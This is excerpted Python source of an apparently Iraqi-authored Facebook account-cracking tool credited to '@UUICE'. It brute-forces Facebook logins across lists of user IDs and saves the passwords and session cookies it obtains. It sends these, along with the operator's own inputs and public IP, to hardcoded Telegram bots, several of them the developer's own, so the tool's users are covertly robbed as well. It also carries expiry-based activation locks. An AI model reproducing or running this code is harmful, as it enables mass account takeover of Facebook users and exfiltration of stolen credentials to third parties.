...
import random,requests;from uuid import uuid4;uui,uid= uuid4(),uuid4();from rich.console import Console;from rich.table import Table;import threading;from user_agent import generate_user_agent;useragnet=str(generate_user_agent())
import secrets
import platform
import psutil 
...
rqjh = str(now.minute)
iwjh = str(now.second)
t=(Yty + "/" + ddtt + "/" + yyyye + " " + uwohw + ":" + rqjh + ":" + iwjh)
hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2024, 3, 30, 0, 0 )
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\033[1;32m تم ايقاف الاداه راسل المطور ابوحرب لتفعيل ')
 time.sleep(1)
 print('\033[1;31m المطور ابوحرب @UUICE    ')
 time.sleep(1)
 print('\033[1;32m  🐉 Abo Harrp 🐉')
 time.sleep(1)
 print('\033[1;31m 1')
 time.sleep(1)
 print('\033[1;32m 2')
...
'''
print(po)
Gold32=random.choice(['😆','🎗','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','✨','👑','🧠','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🩸','⚜️','💎','🌙','🍃','🖥','🕹️','🕊','☠️','🏆','🧿','🌈','🥐','🧀','🍤','🇮🇶','☠️'])
tooken=input(' '+Gold32+' \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  \x1b[38;5;180m𝐓𝐎𝐊𝐄𝐍  \x1b[1;38;5;121m \n   \x1b[38;5;117m   ➜   ')
print('\033[2;35m')
print(' ━━━━━━━━━━━━━━━━━━━━━ ')
IdD=input(' '+Gold32+'  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}  𝐈𝐃 \x1b[1;38;5;121m \n  \x1b[38;5;117m︎  ➜  ')
HHHH = input(' . . . ﺪﻛﺎﺘﻣ ﺖﻧﺍ ﻞﻫ \n  \x1b[38;5;117m︎  ➜')
idp = requests.get("https://api.ipify.org").text
time1 = time.localtime()
time2 = time.strftime('''%d/%m/%Y''')
now = datetime.datetime.now()
current_time = now.strftime("%I:%M:%S")
go1=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
go2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
Gold4=random.choice(['😆','🎗','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','✨','👑','🧠','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🩸','⚜️','💎','🌙','🍃','🖥','🕹️','🕊','☠️','🏆','🧿','🌈','🥐','🧀','🍤','🇮🇶','☠️'])
Goldtok = '7129208811:AAE5tcKncM4l7S01LV8Wu7uLvjxkPw9Fvdg'
Goldid = '1421729649'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
import datetime;now = datetime.date.today();target = datetime.date(2034,3,24,)
if now >=target:exit(" @UUICE لا ضوج 💲 راسلني حتى افعلك @$$")
else:print("تم تشغيل بنجاح")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys


print('\n\033[1;37m ابوحرب المطور 🥵...')
...
# COLOUR
RMAD99 =1421729649
RMAD2 ='7034182669:AAFv9EBBZvhHf6V7FYHTJKj4Nma8eygvzzY'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mHarrpe\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
  Abo Harrp
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mHarrpe\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
...
def auto_file(cookies,access_token):
        ...
        for xd in range(fl):
                ...
                try:
                        ...
                        print(' No internet connection ....')
        Harrpe = "1"
        os.system('cat .txt | grep "'+Harrpe+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/@UUICE.txt \033[0;97m\n')
        #100010138361148
...
def new_file(cookies,access_token):
        ...
        os.system(f'cat {sf} | grep "'+Harrpe+'" > /sdcard/'+son+'')
        print(' عدد ملف ايديات Extracted : '+str(len(total)))
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print(f'\n\n\n{a26}❲ 𝟏 ❳ ✶ ⋗  Numbers password .\n{m1}❲ 𝟐 ❳ ✶ ⋗ No . \n{B}❲ 𝟑 ❳ ✶ ⋗ letters letters . \n{V}❲ 𝟒 ❳ ✶ ⋗ problem . \n');linex()
                                ppp=input(f'{U} Choice . ───َ➛   ') 
                                VVV =(f"""
[ 📱 ] شخص جديد 
═════════════════➢
[🚫] ايدية   » {IdD}
...
[🚫] يحبك   » @Dev_pyc
═════════════════➢""")
                                requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(VVV))   
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mعدد ملف ايديات : \033[1;32m'+total_ids)
                                        print("\033[1;32m ابوحرب تم تشغيل بواسطة")
                                        print("\033[1;34m دز صور UUICE")
                                        print("\033[1;34m تصيد قويه وسريعه اذا ماصادت بدل ملفك")
                                        linex()
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        clear()
                        tl = str(len(user))
                        print(' عدد ملف ايدياتك : \033[1;32m'+tl)
                        print(f'\033[1;32m ابوحرب تم تشغيل بواسطه')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        ...
                        print(' \033[1;32m ابوحرب تم تشغيل بواسطه')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;36m                        '+go2+'꒰'+xxh+' '+ids+'  '+go2+'꒱  \n');sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                Pr = '  ( Harrpe) \n[§] ɪᴅ : '+ids+'\n[§] ᴘᴀssᴡᴏʀᴅ : '+pas+'\nCOOKIS  :'+kuki+'\n▬ ▭ ▬ ▭ ▬ ▭ ▬ ▭ ▬\nᴅᴇᴠ : @UUICE\n\n'
                                print('\r\r\033[1;32m [@UUICE-OK] %s | %s'%(ids,pas))
                                Goldentele =(f"""
[ {Gold4} ] account ready 
═════════════════➢
[{Gold4}] ID   » {ids}
...
[🤴🏻]  => @UUICE""")
                                ...
                                requests.post(f"https://api.telegram.org/bot{tooken}/sendMessage?chat_id={IdD}&text="+str(Pr))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@UUICE-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@UUICE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                Xapps_Golden(kuki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@UUICE-CP] '+ids+' | '+pas+'\033[1;97m')
                                        Goldentele =(f"""
[ {Gold4} ] account ready 
═════════════════➢
[{Gold4}] ID   » {ids}
...
═════════════════➢
[🤴🏻]  => @UUICE""")
                                        requests.post(f"https://api.telegram.org/bot{Goldttn2}/sendMessage?chat_id={Goldiid2}&text="+str(VVV))
                                        open('/sdcard/@UUICE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                if 'session_key' in q:
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                        Pr = '  ( Harrpe) \n[§] ɪᴅ : '+ids+'\n[§] ᴘᴀssᴡᴏʀᴅ : '+pas+'\nCOOKIS  :'+kuki+'\n▬ ▭ ▬ ▭ ▬ ▭ ▬ ▭ ▬\nᴅᴇᴠ : @UUICE\n\n'
                                        print('\r\r\033[1;32m [@UUICE-OK] '+ids+' | '+pas+'\033[1;97m')
                                        Goldentele =(f"""
[ {Gold4} ] account ready 
═════════════════➢
[{Gold4}] ID   » {ids}
...
═════════════════➢
[🤴🏻]  => @UUICE""")
                                        requests.post(f"https://api.telegram.org/bot{Goldttn}/sendMessage?chat_id={Goldiid}&text="+str(Goldentele))
                                        requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(Goldentele))
                                        requests.post(f"https://api.telegram.org/bot{tooken}/sendMessage?chat_id={IdD}&text="+str(Pr))
                                        open('/sdcard/@UUICE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        Xapps_Golden(kuki)
...
[🤴🏻]  => @UUICE""")
                                                ...
                                                open('/sdcard/@UUICECP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@UUICE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@UUICE-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@UUICE_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@UUICE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@UUICE-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Xapps_Golden(kuki):
	...
	try:
		for i in range(len(game)):
			...
			Fo = ("\r%s                 %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
			kil2 = Fo
			requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(kil2))
			requests.post(f"https://api.telegram.org/bot{Goldttn}/sendMessage?chat_id={Goldiid}&text="+str(kil2))
	except AttributeError:
